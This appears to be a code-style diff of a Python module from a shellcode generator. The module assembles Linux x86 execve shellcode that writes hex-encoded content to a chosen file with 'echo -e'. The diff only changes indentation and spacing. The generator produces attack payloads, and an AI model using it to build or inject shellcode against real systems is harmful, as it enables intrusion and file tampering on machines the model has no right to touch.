@@ -11,8 +11,10 @@ shellcode template used : http://shell-storm.org/shellcode/files/shellcode-57.ph
 import binascii
 from core import stack
 from lib.opcoder.linux_x86 import convert
+
+
 def sys(command):
-	return '''push   $0xb
+    return '''push   $0xb
 pop    %%eax
 cltd
 push   %%edx
@@ -36,19 +38,22 @@ push   %%ecx
 push   %%ebx
 mov    %%esp,%%ecx
 int    $0x80
-'''%(str(command))
+''' % (str(command))
+
+
 def run(data):
-	filename,content=data[0],data[1]
-	content = binascii.b2a_hex(content.replace('[space]',' '))
-	l = len(content) -1
-	n = 0
-	c = '\\x'
-	for word in content:
-		c += word
-		n+=1
-		if n is 2:
-			n = 0
-			c += '\\x'
-	c = c[:-2]
-	command = 'echo -e "%s" > %s' %(str(c),str(filename)) 
-	return sys(stack.generate(command.replace('[space]',' '),'%ecx','string'))
+    filename, content = data[0], data[1]
+    content = binascii.b2a_hex(content.replace('[space]', ' '))
+    l = len(content) - 1
+    n = 0
+    c = '\\x'
+    for word in content:
+        c += word
+        n += 1
+        if n is 2:
+            n = 0
+            c += '\\x'
+    c = c[:-2]
+    command = 'echo -e "%s" > %s' % (str(c), str(filename))
+    return sys(stack.generate(
+        command.replace('[space]', ' '), '%ecx', 'string'))
